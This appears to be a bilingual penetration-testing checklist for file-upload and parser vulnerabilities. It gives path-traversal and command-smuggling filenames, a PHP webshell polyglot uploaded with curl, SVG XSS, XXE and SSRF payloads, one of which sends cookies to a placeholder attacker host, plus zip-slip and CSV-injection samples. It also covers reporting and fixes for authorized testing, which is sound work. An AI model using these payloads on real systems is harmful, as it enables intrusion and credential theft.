---
id: clk-file-upload-parser
title: File Upload & Parser
owasp_anchor: [WSTG-INPV, A05:2021]
cwe: [CWE-434, CWE-22, CWE-22]
severity_typical: P1-P2
playbook: playbooks/file_upload_parser.yaml
last_updated: 2026-05-14
sources:
  - docs/intelligence_kb/review_queue/3-cspt-resources-compilation-hunter-blogs-reports-tools.md
  - docs/intelligence_kb/review_queue/resource-3-cspt-resources-compilation-hunter-blogs-reports-tools.md
  - docs/intelligence_kb/techniques/new_2024_2026/13-cspt-file-upload-bypass-to-arbitrary-file-read.md
  - docs/intelligence_kb/techniques/niche_tricks/13-cspt-file-upload-bypass-to-arbitrary-file-read.md
  - docs/intelligence_kb/techniques/niche_tricks/5-dompurify-mxss-bypass-via-node-flattening-namespace-confusion-3-1-0.md
maturity: stable
---

# File Upload & Parser Checklist

> 双语 / Bilingual: 文件上传 + 服务端解析器（图片/文档/压缩包）攻击面合一。
> 用法：先做"Recon & 上传点指纹"判断 sink（直接落盘、CDN、转码、解析渲染），再选"文件名注入"或"内容/解析器注入"分支。
> Authorization-only：永远只用自己的测试租户上传 payload；payload 含 SSRF / RCE 必须先确认 scope。

---

## 1. Recon & 上传点指纹

- [ ] 枚举所有上传入口（头像、附件、CSV 导入、批量导入、PDF preview、富文本嵌图、邮件附件）
- [ ] 抓 multipart 请求，记录 `Content-Type` / `Content-Disposition` / `filename*` / `boundary` 处理方式
- [ ] 区分落地路径：直接 webroot / S3 / GCS / Azure Blob / 私有 CDN / 转码服务 / 内部解析（病毒扫描、缩略图、OCR）
- [ ] 判断后端语言/框架（PHP / Java Servlet / Spring multipart / Django / Express / Rails ActiveStorage / .NET）
- [ ] 找到对应的下载/预览端点，确认是否设置 `Content-Disposition: attachment` 与 `X-Content-Type-Options: nosniff`
- [ ] 列出解析器（ImageMagick、libvips、Pillow, Ghostscript、libpoppler、pdf.js、ffmpeg、libreoffice、unrtf、tika、libmagic、libarchive）
- [ ] 查看 robots.txt / sitemap / JS 中的预签 URL 路径（找 dangling 上传）

## 2. 文件名 / 路径 Trick

### 2.1 路径穿越
- [ ] `../../etc/passwd`、`..%2f..%2fetc%2fpasswd`、双重编码 `..%252f`
- [ ] Windows 路径：`..\\..\\windows\\win.ini`、混合斜杠 `..\\../`
- [ ] UNC 注入：`\\\\attacker\\share\\file.txt`（Windows IIS / SMB）
- [ ] 绝对路径覆盖：`/var/www/html/shell.php`、`C:\\inetpub\\wwwroot\\shell.aspx`

### 2.2 特殊字符 / 编码
- [ ] NUL 字节截断：`shell.php%00.jpg`（旧版 PHP / Java FileInputStream）
- [ ] 长文件名截断（255 / 1024 字节边界）
- [ ] RTL override `‮fdp.php` 让用户看见 `php.pdf`
- [ ] 双扩展名 `shell.php.jpg`、`shell.jpg.php`
- [ ] 大小写绕过 `shell.PhP`、`shell.pHtml`、`shell.PHP5`
- [ ] dotfile / 隐藏文件：`.htaccess`、`.user.ini`、`web.config`、`.htpasswd`
- [ ] 尾随空白 / 点：`shell.php.`、`shell.php ` (Windows 自动 trim)
- [ ] Unicode 同形：`shеll.php`（西里尔字母 e）、ZWJ / ZWNJ 拼接
- [ ] 文件名注入 shell metachar（`shell;rm -rf /.jpg`）影响后续 system()

### 2.3 MIME / Content-Type 信任
- [ ] 仅靠 `Content-Type` 校验 → 改 `image/png` 上传 PHP
- [ ] 仅靠扩展名白名单 → 双扩展 / 大小写绕过
- [ ] 仅靠 magic byte → 在 PNG header 后追加脚本（polyglot）
- [ ] 仅靠 `file` 命令 → libmagic 与 Apache MIME 不一致

## 3. 内容 / Magic Byte / Polyglot

- [ ] GIF89a + `<?php phpinfo(); ?>` polyglot 触发 PHP 包含
- [ ] PDF + JS + ZIP polyglot（PDF + ZIP + EXE）
- [ ] PHAR polyglot：JPG 末尾追加 phar metadata，配合 `phar://` 反序列化
- [ ] HTML in JPG comment → 服务器以 `text/html` 渲染
- [ ] XML / SVG 嵌脚本 → 浏览器以 `image/svg+xml` 直接执行 `<script>`

## 4. SVG（XSS + SSRF + XXE）

- [ ] SVG 内 `<script>alert(1)</script>` → stored XSS（同源 / 子域）
- [ ] SVG 内 `<image href="http://attacker/x">` → SSRF / 探针外发
- [ ] SVG `<foreignObject>` 嵌 HTML 触发 XSS 与 cookie 窃取
- [ ] SVG XXE：`<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- [ ] 上传后预览端点是否 `Content-Type: image/svg+xml`，是否 sandbox / CSP

## 5. 压缩包 / 归档

- [ ] ZIP slip：`../../../../etc/cron.d/x` 路径穿越
- [ ] tar symlink: tar 中 `evil -> /etc/passwd`，再写同名文件覆盖目标
- [ ] zipbomb（42.zip / 嵌套 zip）→ DoS
- [ ] zip64 / split archive 解析差异
- [ ] RAR / 7z exe 嵌入触发解压执行（旧 WinRAR ACE 类）
- [ ] tar 长文件名 / PaxHeader 解析差异
- [ ] gzip / bzip2 流注入

## 6. 文档 / 多媒体解析器

- [ ] ImageMagick policy.xml 是否禁 MVG / MSL / EPHEMERAL / HTTPS coder（[example: ImageTragick CVE-2016-3714 类]）
- [ ] libvips / Pillow 旧版本 BMP / GIF / TIFF 解码漏洞
- [ ] PDF.js / pdfium / poppler 渲染时 JS / form action 行为差异
- [ ] Ghostscript `-dSAFER` 是否启用，PostScript 命令注入 [example: GhostScript -dSAFER bypass 类]
- [ ] LibreOffice headless 转换：DDE 公式注入 / 宏触发 / SSRF via 外部资源
- [ ] ffmpeg HLS / concat / file:// 协议触发本地文件读取（[example: ffmpeg HLS file read 类]）
- [ ] Tika / Apache POI 解析 OOXML：XXE / OLE 嵌入对象 / 远程 template
- [ ] CSV 公式注入：`=cmd|'/c calc'!A1`、`=HYPERLINK(...)`、`@SUM`、`+1+1`
- [ ] EXIF / IPTC / XMP 内嵌 payload（XSS 在管理面板预览）

## 7. 解析器版本差异 / 服务端处理链

- [ ] 同一文件交给 libmagic / file / mime_content_type / Apache 的 MIME 判定不一致
- [ ] 转码链：原文件落盘 + 转码服务（ImageMagick → S3）行为不同
- [ ] 病毒扫描跳过：通过 password-protected zip / archive in archive 绕过 ClamAV
- [ ] 上传后服务异步处理：竞态访问尚未删除的临时文件
- [ ] 后端把扩展名小写后再校验，但落盘保留原大小写 → IIS / Apache 配置差异触发执行

## 8. 自动化辅助

```bash
# 列出所有可上传 endpoint
ffuf -w wordlists/upload.txt -u https://target/FUZZ -mc 200,301,302,403

# 上传 polyglot GIF89a + PHP
printf 'GIF89a;<?php system($_GET["c"]); ?>' > poly.php.gif
curl -F "file=@poly.php.gif" https://target/upload

# Nuclei 模板：不安全上传 + ImageMagick
nuclei -tags fileupload,imagemagick,svg,xxe -u https://target

# 生成 zip slip 测试包
python3 -c "
import zipfile, os
with zipfile.ZipFile('slip.zip','w') as z:
    z.writestr('../../../../tmp/pwned','x')
"

# SVG XSS payload
cat > xss.svg <<'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>fetch('//attacker/'+document.cookie)</script>
</svg>
EOF
curl -F "file=@xss.svg;type=image/svg+xml" https://target/avatar

# 用 exiftool 注入 EXIF payload（弹后台 XSS）
exiftool -Comment='"><script>alert(1)</script>' poc.jpg

# 检查解析器版本差异
file poly.php.gif
mimetype poly.php.gif
python3 -c "import magic; print(magic.from_file('poly.php.gif'))"
```

## 9. Reporting Angle

* **Title 模板**：`<上传点> accepts <绕过手段> leading to <impact> via <解析器/落盘行为>`
  例：`Avatar upload accepts SVG with inline script leading to stored XSS via /preview/<id>`
* **Severity 自评**：
  * 直接 RCE / shell 落盘 → CVSS 3.1 9.0-9.8 / VRT P1
  * Stored XSS（同主域、命中管理员）→ CVSS 6.0-7.5 / VRT P2
  * SSRF via SVG/PDF 触达元数据服务 → CVSS 7.5-8.5 / VRT P1-P2
  * Path traversal 仅写 sandbox 子目录 → CVSS 4.0-5.5 / VRT P3
  * 仅 MIME 错配 / open redirect via download → CVSS ≤ 4.0 / VRT P4
* **CWE 推荐**：
  * RCE / webshell → CWE-434
  * Path traversal / zip slip → CWE-22
  * SVG XSS → CWE-79（需在 frontmatter 备注）
  * XXE in SVG / OOXML → CWE-611
* **PoC 必须**：原始 multipart 请求 + 落地 URL + 触发链截图 + 删除该资源的请求（清理）
* **Suggested Fix**（至少 2 条）：
  * 服务端基于 magic byte + 扩展名白名单双重校验，且把图片重新编码（re-encode）丢弃 metadata
  * 落地路径与 webroot 隔离；下载强制 `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff` + 随机文件名
  * SVG 一律转 PNG 或 sandbox iframe；ImageMagick `policy.xml` 禁危险 coder；ZIP 解压前限制路径前缀与最大体积

## 10. 已迁移技法（来自 KB）

- [[techniques/imagetragick_mvg|ImageMagick MVG/MSL coder 注入]]
- [[techniques/zip_slip_chain|ZIP Slip 跨平台链]]
- [[techniques/svg_xss_avatar|SVG 头像 stored XSS]]
- [[techniques/phar_polyglot|PHAR polyglot 反序列化]]
